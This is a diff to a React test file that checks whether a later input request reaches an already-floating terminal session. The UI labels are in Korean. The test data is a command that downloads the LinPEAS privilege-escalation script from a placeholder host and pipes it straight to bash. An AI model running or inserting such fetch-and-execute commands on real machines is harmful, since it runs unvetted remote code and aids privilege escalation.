@@ -7,9 +7,11 @@ import InteractiveTerminal from "./InteractiveTerminal";
 let mountCount = 0;
 vi.mock("./PtyTerminal", async () => {
   const React = await import("react");
-  return {default: ({sessionId, onClose}: {sessionId: number; onClose: () => void}) => {
+  return {default: ({sessionId, onClose, inputRequest}:
+    {sessionId: number; onClose: () => void; inputRequest?: {id: number; data: string}}) => {
     React.useEffect(() => { mountCount += 1; }, []);
-    return <section>PTY #{sessionId}<button onClick={onClose}>연결 종료</button></section>;
+    return <section>PTY #{sessionId}<button onClick={onClose}>연결 종료</button>
+      {inputRequest && <span>전송: {inputRequest.data}</span>}</section>;
   }};
 });
 
@@ -67,6 +69,26 @@ test("autoFloat 터미널은 원위치를 눌러도 세션이 끊기지 않는�
   expect(screen.getByLabelText(/플로팅 터미널 .* #1/)).toBeTruthy();
   expect(onClose).not.toHaveBeenCalled();
   expect(mountCount).toBe(mountsAfterFloat);
+});
+
+test("autoFloat 터미널이 이미 떠 있어도 새 inputRequest가 실제 PTY까지 전달된다", async () => {
+  // The float effect only captures props once, at the moment it first
+  // floats -- a caller sending a *later* inputRequest (e.g. clicking
+  // "LinPEAS 명령 셸에 입력" after the terminal already floated) used to
+  // update state the already-floating window's frozen closure never saw
+  // again, so the command silently never reached the PTY at all.
+  const view = render(<FloatingTerminalProvider>
+    <InteractiveTerminal sessionId={1} title="세션" autoFloat onClose={vi.fn()} />
+  </FloatingTerminalProvider>);
+  await screen.findByLabelText(/플로팅 터미널 .* #1/);
+  expect(screen.queryByText(/전송:/)).toBeNull();
+
+  view.rerender(<FloatingTerminalProvider>
+    <InteractiveTerminal sessionId={1} title="세션" autoFloat onClose={vi.fn()}
+      inputRequest={{id: 1, data: "curl -sS http://x/linpeas.sh | bash"}} />
+  </FloatingTerminalProvider>);
+
+  expect(await screen.findByText("전송: curl -sS http://x/linpeas.sh | bash")).toBeTruthy();
 });
 
 test("연결 종료 버튼은 여전히 autoFloat 터미널을 실제로 닫는다", async () => {
